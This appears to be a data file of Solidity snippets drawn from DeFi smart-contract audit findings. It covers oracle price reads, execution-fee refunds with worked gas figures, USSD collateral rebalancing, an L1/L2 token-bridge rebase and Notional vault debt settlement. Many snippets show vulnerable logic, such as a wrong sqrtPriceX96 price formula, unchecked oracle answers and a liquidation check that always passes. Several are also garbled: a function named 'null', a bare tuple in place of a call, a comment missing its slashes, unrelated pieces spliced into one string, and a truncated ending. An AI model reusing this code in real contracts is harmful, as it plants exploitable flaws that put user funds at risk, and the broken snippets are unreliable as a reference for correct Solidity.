"```\nreserveRatio = ScalingUtils.scaleByBases(\n    allReserves * valueBase / liabilities,\n    valueBase,\n    tokenManager.RESERVE_RATIO_BASE()\n)\n```\nfor (uint256 i; i < tokenCount; i++) {\n    address token = tokenManager.tokenByIndex(tokenTypeValue, i);\n    uint256 tokenReserve = _getBalance(token);\n    uint256 tokenCollateral = IInsurancePool(insurancePool).getCollateral(token);\n\n    if (tokenReserve > 0 || tokenCollateral > 0) {\n        uint256 price = oracle.getLatestPrice(token);\n\n        reserves += _convert(\n            token,\n            baseToken,\n            tokenReserve,\n            MathUpgradeable.Rounding.Down,\n            price,\n            priceBase,\n            token\n        );\n\n        collaterals += _convert(\n            token,\n            baseToken,\n            tokenCollateral,\n            MathUpgradeable.Rounding.Down,\n            price,\n            priceBase,\n            token\n        );\n    }\n}\n```\nfor (uint256 i; i < tokenCount; i++) {\n    address token = tokenManager.tokenByIndex(tokenTypeValue, i);\n    uint256 tokenSupply = IERC20Token(token).totalSupply();\n\n    if (token == baseToken) {\n        liabilities += tokenSupply;\n    } else if (tokenSupply > 0) {\n        uint256 price = oracle.getLatestPrice(token);\n\n        liabilities += _convert(\n            token,\n            baseToken,\n            tokenSupply,\n            MathUpgradeable.Rounding.Down,\n            price,\n            priceBase,\n            token\n        );\n    }\n}"
"```\n_require(minPrice <= price && price <= maxPrice, Errors.PRICE_INVALID);"
"```\nfunction supplyNativeToken(address user) internal nonReentrant {\n    WethInterface(weth).deposit{value: msg.value}();\n    IERC20(weth).safeIncreaseAllowance(address(ironBank), msg.value);\n    ironBank.supply(address(this), user, weth, msg.value);\n}\n```"
"```\nfunction getPriceFromChainlink(address base, address quote) internal view returns (uint256) {\n    (, int256 price,,,,) = registry.latestRoundData(base, quote);\n    require(price > 0, ""invalid price"");\n\n    return uint256(price) * 10 ** (18 - uint256(registry.decimals(base, quote)));\n}"
"```\nfunction getPriceFromChainlink(address base, address quote) internal view returns (uint256) {\n    (, int256 price,,,,) = registry.latestRoundData(base, quote);\n    require(price > 0, ""invalid price"");\n\n    return uint256(price) * 10 ** (18 - uint256(registry.decimals(base, quote)));\n}\n```"
"```\npragma solidity ^0.8.0;\n\ncontract PriceOracle {\n    function _setAggregators() public {\n        require(\n            aggrs[i].quote == Denominations.ETH ||\n            aggrs[i].quote == Denominations.USD,\n            ""unsupported quote""\n        );\n    }\n}\n```\npragma solidity ^0.8.0;\n\ncontract PriceOracle {\n    function getPrice(address asset) external view returns (uint256) {\n        if (asset == wsteth) {\n            uint256 stEthPrice = getPriceFromChainlink(steth, Denominations.USD);\n            uint256 stEthPerToken = WstEthInterface(wsteth).stEthPerToken();\n            uint256 wstEthPrice = (stEthPrice * stEthPerToken) / 1e18;\n            return getNormalizedPrice(wstEthPrice, asset);\n        }\n        AggregatorInfo memory aggregatorInfo = aggregators[asset];\n        uint256 price = getPriceFromChainlink(aggregatorInfo.base, aggregatorInfo.quote);\n    }\n}"
```\n1 2 3 4 5 6 7 8 9\n<block number>\n\nO1:\n    A B B B C C C D\n    A A B B B C C C\n^^ grouped oracle block ranges\n```
"```\ntry params.contracts.swapHandler.swap(\n    SwapUtils.SwapParams(\n        params.contracts.dataStore,\n        params.contracts.eventEmitter,\n        params.contracts.oracle,\n        Bank(payable(order.market())),\n        params.key,\n        result.outputToken,\n        result.outputAmount,\n        params.swapPathMarkets,\n        0,\n        order.receiver(),\n        order.uiFeeReceiver(),\n        order.shouldUnwrapNativeToken()\n    )\n) returns (address tokenOut, uint256 swapOutputAmount) {\n    (\n        params.contracts.oracle,\n        tokenOut,\n        swapOutputAmount,\n        order.minOutputAmount()\n    );\n} catch (bytes memory reasonBytes) {\n    (string memory reason, /* bool hasRevertMessage */) = ErrorUtils.getRevertMessage(reasonBytes);\n\n    _handleSwapError(\n        params.contracts.oracle,\n        order,\n        result,\n        reason,\n        reasonBytes\n    );\n}\n```\n```\ninternal function null(\n    Oracle oracle,\n    Order.Props memory order,\n    DecreasePositionUtils.DecreasePositionResult memory result,\n    string memory reason,\n    bytes memory reasonBytes\n) {\n    emit SwapUtils.SwapReverted(reason, reasonBytes);\n\n    _validateOutputAmount(\n        oracle,\n        result.outputToken,\n        result.outputAmount,\n        order.minOutputAmount()\n    );\n\n    MarketToken payable(order.market()).transferOut(\n        result.outputToken,\n        order.receiver(),\n        result.outputAmount,\n        order.shouldUnwrapNativeToken()\n    );\n}\n```"
"```\nfunction testGetFundingAmountPerSizeDelta() public {\n    uint result = MarketUtils.getFundingAmountPerSizeDelta(2e15, 1e15 + 1, true);\n    console2.log(""result: %d"", result);\n    uint256 correctResult = 2e15 * 1e15 * 1e30 + 1e15;\n    correctResult = correctResult / (1e15 + 1);\n    console2.log(""correctResult: %d"", correctResult);\n    assertTrue(result == 1e15 * 1e30);\n}\n```"
"```\nfunction getReservedUsd(\n    DataStore dataStore,\n    Market.Props memory market,\n    MarketPrices memory prices,\n    bool isLong\n) internal view returns (uint256) {\n    uint256 reservedUsd;\n\n    if (isLong) {\n        uint256 openInterestInTokens = getOpenInterestInTokens(dataStore, market, isLong);\n        reservedUsd = openInterestInTokens * prices.indexTokenPrice.max;\n    } else {\n        reservedUsd = getOpenInterest(dataStore, market, isLong);\n    }\n\n    return reservedUsd;\n}\n```"
"```\nfunction payExecutionFee(\n    DataStore dataStore,\n    EventEmitter eventEmitter,\n    StrictBank bank,\n    uint256 executionFee,\n    uint256 startingGas,\n    address keeper,\n    address user\n) external {\n    uint256 gasUsed = startingGas * 64 / 63;\n    uint256 executionFeeForKeeper = adjustGasUsage(dataStore, gasUsed) * tx.gasprice;\n\n    if (executionFeeForKeeper > executionFee) {\n        executionFeeForKeeper = executionFee;\n    }\n\n    bank.transferOutNativeToken(\n        keeper,\n        executionFeeForKeeper\n    );\n\n    emitKeeperExecutionFee(eventEmitter, keeper, executionFeeForKeeper);\n\n    uint256 refundFeeAmount = executionFee - executionFeeForKeeper;\n    if (refundFeeAmount == 0) {\n        return;\n    }\n\n    bank.transferOutNativeToken(\n        user,\n        refundFeeAmount\n    );\n\n    emitExecutionFeeRefund(eventEmitter, user, refundFeeAmount);\n}\n```\n```\nFile: contracts/exchange/DepositHandler.sol\n\nfunction executeDeposit(\n    bytes32 key,\n    OracleUtils.SetPricesParams calldata oracleParams\n) external\n    globalNonReentrant\n    onlyOrderKeeper\n    withOraclePrices(oracle, dataStore, eventEmitter, oracleParams)\n{\n    uint256 startingGas = gasleft();\n\n    try this._executeDeposit(\n        key,\n        oracleParams,\n        msg.sender\n    ) {\n    } catch (bytes memory reasonBytes) {\n        // rest of code\n    }\n}\n\nfunction _executeDeposit(\n    bytes32 key,\n    OracleUtils.SetPricesParams memory oracleParams,\n    address keeper\n) external onlySelf {\n    uint256 startingGas = gasleft();\n    // rest of code\n\n    ExecuteDepositUtils.executeDeposit(params);\n}\n\nFile: contracts/deposit/ExecuteDepositUtils.sol\n\nfunction executeDeposit(ExecuteDepositParams memory params) external {\n    // rest of code\n\n    GasUtils.payExecutionFee(\n        params.dataStore,\n        params.eventEmitter,\n        params.depositVault,\n        deposit.executionFee(),\n        params.startingGas,\n        params.keeper,\n        deposit.account()\n    );\n}\n\nFile: contracts/gas/GasUtils.sol\n\nfunction payExecutionFee(\n    DataStore dataStore,\n    EventEmitter eventEmitter,\n    StrictBank bank,\n    uint256 executionFee,\n    uint256 startingGas,\n    address keeper,\n    address user\n) external {\n    uint256 gasUsed = startingGas - gasleft();\n    uint256 executionFeeForKeeper = adjustGasUsage(dataStore, gasUsed) * tx.gasprice;\n\n    if (executionFeeForKeeper > executionFee) {\n        executionFeeForKeeper = executionFee;\n    }\n\n    bank.transferOutNativeToken(\n        keeper,\n        executionFeeForKeeper\n    );\n\n    emitKeeperExecutionFee(eventEmitter, keeper, executionFeeForKeeper);\n\n    uint256 refundFeeAmount = executionFee - executionFeeForKeeper;\n    if (refundFeeAmount == 0) {\n        return;\n    }\n\n    bank.transferOutNativeToken(\n        user,\n        refundFeeAmount\n    );\n\n    emitExecutionFeeRefund(eventEmitter, user, refundFeeAmount);\n}\n\nfunction adjustGasUsage(DataStore dataStore, uint256 gasUsed) internal view returns (uint256) {\n    // rest of code\n    uint256 baseGasLimit = dataStore.getUint(Keys.EXECUTION_GAS_FEE_BASE_AMOUNT);\n    // rest of code\n    uint256 multiplierFactor = dataStore.get\n```\nEXECUTION_GAS_FEE_BASE_AMOUNT = 0\nEXECUTION_GAS_FEE_MULTIPLIER_FACTOR = 1\n\nexecutionFeeUserHasPaid = 200000\ntx.gasprice = 1\nactualUsedGas = 100000\n```\n```\nstartingGas = 164000\n```\n```\nuint256 gasUsed = startingGas - gasleft();\ngasUsed = 164K - (164K - 100K) * 63 / 64;\ngasUsed = 101K\n```\n```\nexecutionFeeForKeeper = 101K * tx.gasprice\nexecutionFeeForKeeper = 101K * 1 Gwei\nexecutionFeeForKeeper = 101K Gwei\n\nrefundFeeForUser = 200K - 101K\nrefundFeeForUser = 99K Gwei\n```\n```\nuint256 gasUsed = startingGas - gasleft();\ngasUsed = 6500K - (6500K - 100K) * 63 / 64;\ngasUsed = 200K\n```\n```\nexecutionFeeForKeeper = 200000 * tx.gasprice\nexecutionFeeForKeeper = 200000 * 1\nexecutionFeeForKeeper = 200000 Gwei\n\nrefundFeeForUser = 200000 - 200000\nrefundFeeForUser = 0 Gwei\n```"
"```\nfunction removeOracleSignerAfterSignal(address account) external onlyTimelockAdmin nonReentrant {\n    bytes32 actionKey = _addOracleSignerActionKey(account);\n    _validateAndClearAction(actionKey, ""removeOracleSigner"");\n\n    oracleStore.removeSigner(account);\n\n    EventUtils.EventLogData memory eventData;\n    eventData.addressItems.initItems(1);\n    eventData.addressItems.setItem(0, ""account"", account);\n    eventEmitter.emitEventLog1(\n        ""RemoveOracleSigner"",\n        actionKey,\n        eventData\n    );\n}\n```"
"```\nfunction rebase(uint32 _l2Gas) external {\n    inflationMultiplier = IECO(l1Eco).getPastLinearInflation(block.number);\n}\n```\nIECO(_l1Token).transferFrom(_from, address(this), _amount);\n_amount = _amount * inflationMultiplier;\n```\nuint256 _amount = _gonsAmount / inflationMultiplier;\nbytes memory _ecoTransferMessage = abi.encodeWithSelector(\n    IERC20.transfer.selector,\n    _to,\n    _amount\n);\n```\nfunction rebase(uint256 _inflationMultiplier)\n    external\n    virtual\n    onlyFromCrossDomainAccount(l1TokenBridge)\n    validRebaseMultiplier(_inflationMultiplier)\n{\n    inflationMultiplier = _inflationMultiplier;\n    l2Eco.rebase(_inflationMultiplier);\n    emit RebaseInitiated(_inflationMultiplier);\n}\n```"
"```\nfunction rebase(uint32 _l2Gas) external {\n    inflationMultiplier = IECO(l1Eco).getPastLinearInflation(block.number);\n\n    bytes memory message = abi.encodeWithSelector(\n        IL2ECOBridge.rebase.selector,\n        inflationMultiplier\n    );\n\n    sendCrossDomainMessage(l2TokenBridge, _l2Gas, message);\n}\n```"
"```\nconstructor() {\n    priceFeedDAIETH = AggregatorV3Interface(\n        0x773616E4d11A78F511299002da57A0a94577F1f4\n    );\n}\n\nfunction getPrice() {\n    (, int256 price,,, ) = priceFeedDAIETH.latestRoundData();\n}\n```\n```\nuint256 DAIWethPrice = DAIEthOracle.quoteSpecificPoolsWithTimePeriod(\n    1000000000000000000, // 1 Eth\n    0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, \n    0x6B175474E89094C44Da98b954EedeAC495271d0F, \n    pools, \n    600 // period\n);\n```\n```\nreturn (\n    (wethPriceUSD * 1e18) /\n    ((DAIWethPrice + uint256(price) * 1e10) / 2)\n)"
"```\nfor (uint256 i = 0; i < collateral.length; i++) {\n    uint256 collateralval = IERC20Upgradeable(collateral[i].token).balanceOf(USSD) * 1e18 / (10**IERC20MetadataUpgradeable(collateral[i].token).decimals()) * collateral[i].oracle.getPriceUSD() / 1e18;\n    if (collateralval * 1e18 / ownval < collateral[i].ratios[flutter]) {\n        if (collateral[i].token!= uniPool.token0() || collateral[i].token!= uniPool.token1()) {\n            IUSSD(USSD).UniV3SwapInput(collateral[i].pathbuy, daibought / portions);\n        }\n    }\n}\n```"
```\nprice = uint(sqrtPriceX96) * (uint(sqrtPriceX96)) / (1e6) * (96 * 2);\n```\nprice = uint(sqrtPriceX96) * uint(sqrtPriceX96) * 1e6 * (96 * 2)\n```\n```\nprice = uint(sqrtPriceX96) * (uint(sqrtPriceX96)) * (1e18) * (96 * 2)\n        price = (1e24 / price) / 1e12\n```\n```\nprice = uint(sqrtPriceX96) * (uint(sqrtPriceX96)) * (1e6 * (1e12 + 1e6)) * (96 * 2);\n\nprice = (1e24 / price) / 1e12;
"```\nfunction getPriceUSD() external view override returns (uint256) {\n    address[] memory pools = new address[](1);\n    pools[0] = 0x60594a405d53811d3BC4766596EFD80fd545A270;\n    uint256 DAIWethPrice = DAIEthOracle.quoteSpecificPoolsWithTimePeriod(\n        1000000000000000000, // 1 Eth\n        0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, // WETH (base token)\n        0x6B175474E89094C44Da98b954EedeAC495271d0F, // DAI (quote token)\n        pools, // DAI/WETH pool uni v3\n        600 // period\n    );\n\n    uint256 wethPriceUSD = ethOracle.getPriceUSD();\n\n    uint256 price;\n    (, price,,,) = priceFeedDAIETH.latestRoundData();\n\n    return (wethPriceUSD * 1e18) / ((DAIWethPrice + uint256(price) * 1e10) / 2);\n}\n```"
```\nuint256 amountToSellUnits = \n    IERC20Upgradeable(collateral[i].token).balanceOf(USSD) * \n    ((amountToBuyLeftUSD * 1e18 / collateralval) / 1e18) / 1e18;\n```\n```\nuint256 amountToSellUnits = (collateralBalance * amountToBuyLeftUSD * 1e18) / (collateralval * 1e18 * 1e18);\n\nuint256 amountToSellUnits = (collateralBalance * amountToBuyLeftUSD) / (collateralval * 1e18);\n```
"```\n(, int256 price,,, ) = priceFeedDAIETH.latestRoundData();\n\nreturn (wethPriceUSD * 1e18) / ((DAIWethPrice + uint256(price) * 1e10) / 2);\n```"
"```\nuint256 collateralval = IERC20Upgradeable(collateral[i].token).balanceOf(USSD) * 1e18 / (10**IERC20MetadataUpgradeable(collateral[i].token).decimals()) * collateral[i].oracle.getPriceUSD() / 1e18;\n\nif (collateralval > amountToBuyLeftUSD) {\n    if (collateral[i].pathsell.length > 0) {\n        uint256 amountBefore = IERC20Upgradeable(baseAsset).balanceOf(USSD);\n        uint256 amountToSellUnits = IERC20Upgradeable(collateral[i].token).balanceOf(USSD) * ((amountToBuyLeftUSD * 1e18 / collateralval) / 1e18) / 1e18;\n        IUSSD(USSD).UniV3SwapInput(collateral[i].pathsell, amountToSellUnits);\n        amountToBuyLeftUSD -= (IERC20Upgradeable(baseAsset).balanceOf(USSD) - amountBefore);\n        DAItosell += (IERC20Upgradeable(baseAsset).balanceOf(USSD) - amountBefore);\n    } else {\n```\n```\nif (collateralval >= amountToBuyLeftUSD / 20) {\n    uint256 amountBefore = IERC20Upgradeable(baseAsset).balanceOf(USSD);\n    IUSSD(USSD).UniV3SwapInput(collateral[i].pathsell, IERC20Upgradeable(collateral[i].token).balanceOf(USSD));\n    amountToBuyLeftUSD -= (IERC20Upgradeable(baseAsset).balanceOf(USSD) - amountBefore);\n    DAItosell += (IERC20Upgradeable(baseAsset).balanceOf(USSD) - amountBefore);\n}\n```"
"```\ncontract StableOracleWBTC is IStableOracle {\n    AggregatorV3Interface priceFeed;\n\n    constructor() {\n        priceFeed = AggregatorV3Interface(\n            0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419\n        );\n    }\n\n    function getPriceUSD() external view override returns (uint256) {\n        (, int256 price,,, ) = priceFeed.latestRoundData();\n        return uint256(price) * 1e10;\n    }\n}"
```\nfunction collateralFactor() public view override returns (uint256) {\n    uint256 totalAssetsUSD = 0;\n    for (uint256 i = 0; i < collateral.length; i++) {\n        totalAssetsUSD +=\n            (\n                (\n                    IERC20Upgradeable(collateral[i].token).balanceOf(address(this)) * 1e18\n                ) /\n                (10 ** IERC20MetadataUpgradeable(collateral[i].token).decimals()\n                ) *\n                collateral[i].oracle.getPriceUSD()\n            ) / 1e18;\n    }\n    return (totalAssetsUSD * 1e6) / totalSupply();\n}\n```\n```\nfunction removeCollateral(uint256 _index) public onlyControl {\n    collateral[_index] = collateral[collateral.length - 1];\n    collateral.pop();\n}\n```
"```\nif (collateralval > amountToBuyLeftUSD) {\n    if (collateral[i].pathsell.length > 0) {\n        uint256 amountBefore = IERC20Upgradeable(baseAsset).balanceOf(USSD);\n        uint256 amountToSellUnits = IERC20Upgradeable(collateral[i].token).balanceOf(USSD) * ((amountToBuyLeftUSD * 1e18 / collateralval) / 1e18) / 1e18;\n        IUSSD(USSD).UniV3SwapInput(collateral[i].pathsell, amountToSellUnits);\n        amountToBuyLeftUSD -= (IERC20Upgradeable(baseAsset).balanceOf(USSD) - amountBefore);\n        DAItosell += (IERC20Upgradeable(baseAsset).balanceOf(USSD) - amountBefore);\n    } else {\n        DAItosell = IERC20Upgradeable(collateral[i].token).balanceOf(USSD) * amountToBuyLeftUSD / collateralval;\n    }\n} else {\n    if (collateralval >= amountToBuyLeftUSD / 20) {\n        uint256 amountBefore = IERC20Upgradeable(baseAsset).balanceOf(USSD);\n        IUSSD(USSD).UniV3SwapInput(collateral[i].pathsell, IERC20Upgradeable(collateral[i].token).balanceOf(USSD));\n        amountToBuyLeftUSD -= (IERC20Upgradeable(baseAsset).balanceOf(USSD) - amountBefore);\n        DAItosell += (IERC20Upgradeable(baseAsset).balanceOf(USSD) - amountBefore);\n    }\n}\n```"
"```\nfunction latestRoundData(\n  address base,\n  address quote\n)\n  external\n  view\n  override\n  returns (\n    uint80 roundId,\n    int256 answer,\n    uint256 startedAt,\n    uint256 updatedAt,\n    uint80 answeredInRound\n  ) {\n  uint16 currentPhaseId = s_currentPhaseId[base][quote];\n  AggregatorV2V3Interface aggregator = _getFeed(base, quote);\n  require(address(aggregator)!= address(0), ""Feed not found"");\n  (\n    roundId,\n    answer,\n    startedAt,\n    updatedAt,\n    answeredInRound\n  ) = aggregator.latestRoundData();\n  return _addPhaseIds(roundId, answer, startedAt, updatedAt, answeredInRound, currentPhaseId);\n}\n```"
"```\nfunction rebalance() override public {\n    uint256 ownval = getOwnValuation(); // it low enough to dive into if statement (see line below)\n    (uint256 USSDamount, uint256 DAIamount) = getSupplyProportion(); // (3000e6 USSD, 2000e18 DAI)\n\n    if (ownval < 1e6 - threshold) {\n        // peg-down recovery\n        BuyUSSDSellCollateral((USSDamount - DAIamount / 1e12) / 2); // 500 * 1e6 = (3000e6 - 2000e18 / 1e12) / 2\n```\n```\nfunction BuyUSSDSellCollateral(uint256 amountToBuy) internal {\n    CollateralInfo[] memory collateral = IUSSD(USSD).collateralList();\n\n    uint amountToBuyLeftUSD = amountToBuy * 1e12;\n\n    uint DAItosell = 0;\n\n    for (uint256 i = 0; i < collateral.length; i++) {\n        uint256 collateralval = IERC20Upgradeable(collateral[i].token).balanceOf(USSD) * 1e18 / (10**IERC20MetadataUpgradeable(collateral[i].token).decimals()) * collateral[i].oracle.getPriceUSD() / 1e18;\n\n        if (collateralval > amountToBuyLeftUSD) {\n            if (collateral[i].pathsell.length > 0) {\n                uint256 amountBefore = IERC20Upgradeable(baseAsset).balanceOf(USSD);\n                uint256 amountToSellUnits = IERC20Upgradeable(collateral[i].token).balanceOf(USSD) * ((amountToBuyLeftUSD * 1e18 / collateralval) / 1e18) / 1e18;\n                IUSSD(USSD).UniV3SwapInput(collateral[i].pathsell, amountToSellUnits);\n                amountToBuyLeftUSD -= (IERC20Upgradeable(baseAsset).balanceOf(USSD) - amountBefore);\n                DAItosell += (IERC20Upgradeable(baseAsset).balanceOf(USSD) - amountBefore);\n            }\n        }\n    }\n```"
"```\nuint256 cf = IUSSD(USSD).collateralFactor();\nuint256 flutter = 0;\n\nfor (flutter = 0; flutter < flutterRatios.length; flutter++) {\n    if (cf < flutterRatios[flutter]) {\n        break;\n    }\n}\n```\n```\nif (collateralval * 1e18 / ownval < collateral[i].ratios[flutter]):\n    portions++\n```\n```\nif (collateralval * 1e18 / ownval < collateral[i].ratios[flutter]):\n    if (collateral[i].token!= uniPool.token0() or collateral[i].token!= uniPool.token1()):\n        IUSSD(USSD).UniV3SwapInput(collateral[i].pathbuy, daibought/portions)\n```"
"```\nfunction claimCOMPAndTransfer(address[] calldata cTokens)\n    external\n    override\n    onlyManagerContract\n    nonReentrant\n    returns (uint256)\n{\n    uint256 balanceBefore = COMP.balanceOf(address(this));\n    COMPTROLLER.claimComp(address(this), cTokens);\n    uint256 balanceAfter = COMP.balanceOf(address(this));\n\n    uint256 netBalance = balanceAfter.sub(balanceBefore);\n    if (netBalance > 0) {\n        COMP.safeTransfer(msg.sender, netBalance);\n    }\n\n    return netBalance;\n}\n```\nfunction claimComp(address holder, CToken[] memory cTokens) public {\n    address[] memory holders = new address[](1);\n    holders[0] = holder;\n    claimComp(holders, cTokens, true, true);\n}\n```"
"```\nfunction repayAccountPrimeDebtAtSettlement(\n    PrimeRate memory pr,\n    VaultStateStorage storage primeVaultState,\n    uint16 currencyId,\n    address vault,\n    address account,\n    int256 accountPrimeCash,\n    int256 accountPrimeStorageValue\n) internal returns (int256 finalPrimeDebtStorageValue, bool didTransfer) {\n    if (netPrimeDebtRepaid < accountPrimeStorageValue) {\n        // If the net debt change is greater than the debt held by the account, then only\n        // decrease the total prime debt by what is held by the account. The residual amount\n        // will be refunded to the account via a direct transfer.\n        netPrimeDebtChange = accountPrimeStorageValue;\n        finalPrimeDebtStorageValue = 0;\n\n        int256 primeCashRefund = pr.convertFromUnderlying(\n            pr.convertDebtStorageToUnderlying(netPrimeDebtChange.sub(accountPrimeStorageValue))\n        );\n        TokenHandler.withdrawPrimeCash(\n            account, currencyId, primeCashRefund, pr, false\n        );\n        didTransfer = true;\n    } else {\n```"
"```\nfunction _setAccountMaturity(\n    VaultAccountSecondaryDebtShareStorage storage accountStorage,\n    int256 accountDebtOne,\n    int256 accountDebtTwo,\n    uint40 maturity\n) private {\n    if (accountDebtOne == 0 && accountDebtTwo == 0) {\n        if both debt shares are cleared to zero, clear the maturity as well.\n        accountStorage.maturity = 0;\n    } else {\n        // In all other cases, set the account to the designated maturity\n        accountStorage.maturity = maturity;\n    }\n}\n```\n```\nfunction _reduceAccountDebt(\n    VaultConfig memory vaultConfig,\n    VaultState memory vaultState,\n    VaultAccount memory vaultAccount,\n    PrimeRate memory primeRate,\n    uint256 currencyIndex,\n    int256 depositUnderlyingInternal,\n    bool checkMinBorrow\n) private {\n    if (currencyIndex == 0) {\n        vaultAccount.updateAccountDebt(vaultState, depositUnderlyingInternal, 0);\n        vaultState.setVaultState(vaultConfig);\n    } else {\n        PrimeRate[2] memory pr;\n        pr[currencyIndex - 1] = primeRate;\n\n        VaultSecondaryBorrow.updateAccountSecondaryDebt(\n            vaultConfig,\n            vaultAccount.account,\n            vaultAccount.maturity,\n            currencyIndex == 1? depositUnderlyingInternal : 0,\n            currencyIndex == 2? depositUnderlyingInternal : 0,\n            pr,\n            checkMinBorrow\n        );\n    }\n}\n```\n```\nfunction updateAccountSecondaryDebt(\n    VaultConfig memory vaultConfig,\n    address account,\n    uint256 maturity,\n    int256 netUnderlyingDebtOne,\n    int256 netUnderlyingDebtTwo,\n    PrimeRate[2] memory pr,\n    bool checkMinBorrow\n) internal {\n    VaultAccountSecondaryDebtShareStorage storage accountStorage = \n        LibStorage.getVaultAccountSecondaryDebtShare()[account][vaultConfig.vault];\n\n    // Check maturity\n    uint256 accountMaturity = accountStorage.maturity;\n    require(accountMaturity == maturity || accountMaturity == 0);\n\n    int256 accountDebtOne = VaultStateLib.readDebtStorageToUnderlying(pr[0], maturity, accountStorage.accountDebtOne); \n    int256 accountDebtTwo = VaultStateLib.readDebtStorageToUnderlying(pr[1], maturity, accountStorage.accountDebtTwo);\n\n    if (netUnderlyingDebtOne!= 0) {\n        accountDebtOne = accountDebtOne.add(netUnderlyingDebtOne);\n\n        _updateTotalSecondaryDebt(\n            vaultConfig, account, vaultConfig.secondaryBorrowCurrencies[0], maturity, netUnderlyingDebtOne, pr[0]\n        );\n\n        accountStorage.accountDebtOne = VaultStateLib.calculateDebtStorage(pr[0], maturity, accountDebtOne)\n           .neg().toUint().toUint80();\n    }\n\n    if (netUnderlyingDebtTwo!= 0) {\n        accountDebtTwo = accountDebtTwo.add(netUnderlyingDebtTwo);\n\n        _updateTotalSecondaryDebt(\n            vaultConfig, account, vaultConfig.secondaryBorrowCurrencies[1], maturity, netUnderlyingDebtTwo, pr[1]\n        );\n\n        accountStorage.accountDebtTwo = VaultStateLib.calculateDebtStorage(pr[1], maturity, accountDebtTwo)\n           .neg().toUint().toUint80();\n    }\n\n    if (checkMinBorrow) {\n        // No overflow on negation due to overflow checks above\n        require(accountDebtOne == 0 || vaultConfig.minAccountSecondaryBorrow[0] <= -accountDebtOne, ""min borrow"");\n        require(accountDebtTwo == 0 || vaultConfig.minAccountSecondaryBorrow[1] <= -accountDebtTwo, ""min borrow"");\n    }\n\n    _setAccountMaturity(accountStorage, accountDebtOne, accountDebtTwo\n```\nstruct VaultAccountSecondaryDebtShareStorage {\n    uint40 maturity;\n    // This is stored separately from the vault account maturity to ensure that we have access to the proper state\n    // during a roll borrow position. It should never be allowed to deviate from the vaultAccount.maturity value (unless it is cleared to zero).\n    uint80 accountDebtOne;\n    uint80 accountDebtTwo;\n}"
"```\nFile: VaultAccountAction.sol\n\nif (vaultAccount.accountDebtUnderlying == 0 && vaultAccount.vaultShares == 0) {\n    vaultAccount.maturity = 0;\n}\nvaultAccount.setVaultAccount({vaultConfig: vaultConfig, checkMinBorrow: true});\n\nif (vaultAccount.maturity!= 0) {\n    IVaultAccountHealth(address(this)).checkVaultAccountCollateralRatio(vault, account);\n}\n```"
"```\nfunction _redeemAndTransfer(uint16 currencyId, int256 primeCashRedeemAmount) private returns (uint256) {\n    PrimeRate memory primeRate = PrimeRateLib.buildPrimeRateStateful(currencyId);\n    int256 actualTransferExternal = TokenHandler.withdrawPrimeCash(\n        treasuryManagerContract,\n        currencyId,\n        primeCashRedeemAmount.neg(),\n        primeRate,\n        true // if ETH, transfers it as WETH\n    );\n\n    require(actualTransferExternal > 0);\n    return uint256(actualTransferExternal);\n}\n```"
"```\nfunction _redeemMoneyMarketIfRequired(\n    uint16 currencyId,\n    Token memory underlying,\n    uint256 withdrawAmountExternal\n) private {\n    mapping(address => uint256) storage store = LibStorage.getStoredTokenBalances();\n    uint256 currentBalance = store[underlying.tokenAddress];\n    if (withdrawAmountExternal <= currentBalance) {\n        return;\n    }\n\n    IPrimeCashHoldingsOracle oracle = PrimeCashExchangeRate.getPrimeCashHoldingsOracle(currencyId);\n    (RedeemData[] memory data) = oracle.getRedemptionCalldata(withdrawAmountExternal);\n\n    uint256 totalUnderlyingRedeemed = executeMoneyMarketRedemptions(underlying, data);\n\n    require(withdrawAmountExternal <= currentBalance.add(totalUnderlyingRedeemed)); // dev: insufficient redeem\n}\n```"
"```\nFile: VaultValuation.sol\n\nif (depositUnderlyingInternal < maxLiquidatorDepositLocal) {\n    if (debtOutstanding - depositUnderlyingInternal < minBorrowSize) {\n        require(\n            h.debtOutstanding[currencyIndex].sub(depositUnderlyingInternal) < minBorrowSize,\n            ""Must Liquidate All Debt""\n        );\n    }\n```\n```\nrequire(\n    h.debtOutstanding[currencyIndex].sub(depositUnderlyingInternal) < minBorrowSize,\n    ""Must Liquidate All Debt""\n);\n```\nrequire(\n  (-100 USDC - 70 USDC) < 50 USDC\n);\n\nrequire(\n  (-170 USDC) < 50 USDC\n);\n\nrequire(true);"
"```\nfunction repayAccountPrimeDebtAtSettlement(\n    PrimeRate memory pr,\n    VaultStateStorage storage primeVaultState,\n    uint16 currencyId,\n    address vault,\n    address account,\n    int256 accountPrimeCash,\n    int256 accountPrimeStorageValue\n) internal returns (int256 finalPrimeDebtStorageValue, bool didTransfer) {\n    didTransfer = false;\n    finalPrimeDebtStorageValue = accountPrimeStorageValue;\n\n    if (accountPrimeCash > 0) {\n        int256 netPrimeDebtRepaid = pr.convertUnderlyingToDebtStorage(\n            pr.convertToUnderlying(accountPrimeCash).neg()\n        );\n\n        int256 netPrimeDebtChange;\n        if (netPrimeDebtRepaid < accountPrimeStorageValue) {\n            netPrimeDebtChange = accountPrimeStorageValue;\n            finalPrimeDebtStorageValue = 0;\n\n            int256 primeCashRefund = pr.convertFromUnderlying(\n                pr.convertDebtStorageToUnderlying(netPrimeDebtChange.sub(accountPrimeStorageValue))\n            );\n            TokenHandler.withdrawPrimeCash(\n                account, currencyId, primeCashRefund, pr, false\n            );\n            didTransfer = true;\n        } else {\n            netPrimeDebtChange = netPrimeDebtRepaid;\n            finalPrimeDebtStorageValue = accountPrimeStorageValue.sub(netPrimeDebtRepaid);\n        }\n\n        pr.updateTotalPrimeDebt(vault, currencyId, netPrimeDebtChange);\n\n        int256 totalPrimeDebt = int256(uint256(primeVaultState.totalDebt));\n        int256 newTotalDebt = totalPrimeDebt.add(netPrimeDebtChange);\n        primeVaultState.totalDebt = newTotalDebt.toUint().toUint80();\n    }\n}\n```\nfunction withdrawPrimeCash(\n    address account,\n    uint16 currencyId,\n    int256 primeCashToWithdraw,\n    PrimeRate memory primeRate,\n    bool withdrawWrappedNativeToken\n) internal returns (int256 netTransferExternal) {\n    if (primeCashToWithdraw == 0) {\n        return 0;\n    }\n    require(primeCashToWithdraw < 0);\n\n    Token memory underlying = getUnderlyingToken(currencyId);\n    netTransferExternal = convertToExternal(\n        underlying,\n        primeRate.convertToUnderlying(primeCashToWithdraw)\n    );\n\n    uint256 withdrawAmount = uint256(netTransferExternal).neg();\n\n    _redeemMoneyMarketIfRequired(currencyId, underlying, withdrawAmount);\n\n    if (underlying.tokenType == 